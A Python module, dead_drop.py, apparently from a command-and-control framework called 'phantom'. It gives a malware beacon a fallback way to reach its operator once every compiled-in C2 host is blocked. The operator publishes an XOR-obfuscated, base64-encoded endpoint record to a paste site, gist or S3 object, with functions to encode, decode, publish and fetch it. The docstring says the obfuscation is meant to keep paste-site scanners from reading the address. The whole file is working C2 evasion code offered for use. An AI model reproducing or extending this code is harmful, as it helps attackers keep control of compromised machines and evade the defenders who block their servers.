"""dead_drop.py — the beacon's last-resort endpoint source.

A compiled-in endpoint ladder (C2_HOST + C2_HOSTS) is still a finite list:
if every rung is filtered or retired, the beacon has nowhere to call, and the
operator has no way to reach it any more. The dead drop is ONE neutral URL
(a paste, a gist, an S3 object the operator controls) that holds the CURRENT
endpoint. The beacon consults it only after the whole ladder has failed, so
the extra request is paid once, on an address that is not the target's C2.

The record is opaque to the host and signed by nothing: it is XOR-obfuscated
so a naive scanner/paste index does not read `host:port` in clear, then
base64'd so it survives as one line. It is NOT a secret — the value is
integrity-of-delivery, not confidentiality; never put a credential in it.

The same codec is implemented in the beacon (``network.h``): one format, two
languages, pinned by tests on the Python side and by the syntax/contract jobs
on the C++ side.
"""
from __future__ import annotations

import base64
import os
import urllib.error
import urllib.request
from typing import Dict, Optional

# The XOR key is a format constant, mirrored in network.h (C2_DEADDROP_KEY).
# Changing it is a breaking change to both sides at once.
DD_KEY = 0x5A
_NAME = "phx1"


def encode_record(host: str, port: int, use_ssl: bool = True) -> str:
    """Encode an endpoint as the one-line dead-drop record."""
    host = (host or "").strip()
    if not host:
        raise ValueError("dead drop needs a host")
    plain = f"{_NAME}|{host}|{int(port)}|{1 if use_ssl else 0}".encode()
    return base64.b64encode(bytes(b ^ DD_KEY for b in plain)).decode()


def decode_record(text: str) -> Optional[Dict[str, object]]:
    """Decode a record, or None when the page is not one.

    Tolerant of the whitespace a paste host adds around the payload, but
    strict about the shape: a wrong or truncated record must be refused, not
    half-applied (a beacon pointed at a garbage endpoint has no ladder left).
    """
    if not text:
        return None
    raw = "".join((text or "").split())
    try:
        data = bytes(b ^ DD_KEY for b in base64.b64decode(raw, validate=True))
    except Exception:
        return None
    try:
        parts = data.decode("utf-8").split("|")
    except Exception:
        return None
    if len(parts) != 4 or parts[0] != _NAME:
        return None
    host = parts[1].strip()
    if not host:
        return None
    try:
        port = int(parts[2])
    except ValueError:
        return None
    if not (0 < port < 65536):
        return None
    return {"host": host, "port": port, "use_ssl": parts[3] == "1"}


def _is_url(target: str) -> bool:
    return target.lower().startswith(("http://", "https://"))


def publish(target: str, host: str, port: int, use_ssl: bool = True,
            timeout: float = 10.0, method: str = "PUT") -> bool:
    """Put the record at the dead drop.

    ``target`` is an http(s) URL (an S3 presigned PUT, a paste endpoint) or
    a filesystem path (air-gapped bench). Returns True only on a real 2xx —
    an operator who believes the dead drop is live when it is not has lost
    the fallback silently.
    """
    record = encode_record(host, port, use_ssl)
    if not _is_url(target):
        try:
            parent = os.path.dirname(os.path.abspath(target))
            if parent:
                os.makedirs(parent, exist_ok=True)
            with open(target, "w", encoding="utf-8") as handle:
                handle.write(record + "\n")
            return True
        except OSError:
            return False
    try:
        req = urllib.request.Request(
            target, data=record.encode(), method=method,
            headers={"Content-Type": "text/plain"})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return 200 <= int(getattr(resp, "status", resp.getcode())) < 300
    except (urllib.error.URLError, OSError, ValueError):
        return False


def fetch(target: str, timeout: float = 10.0) -> Optional[Dict[str, object]]:
    """Read the endpoint currently at the dead drop (operator-side check)."""
    try:
        if _is_url(target):
            with urllib.request.urlopen(target, timeout=timeout) as resp:
                body = resp.read(4096).decode("utf-8", "replace")
        else:
            with open(target, encoding="utf-8") as handle:
                body = handle.read(4096)
    except (urllib.error.URLError, OSError, ValueError):
        return None
    return decode_record(body)


def configured_url() -> str:
    """The dead-drop URL the operator configured (`c2.dead_drop`), or ""."""
    try:
        from phantom.utils import config as cfg
        return str(cfg.get("c2.dead_drop", "", env="PHANTOM_C2_DEADDROP") or "")
    except Exception:
        return ""
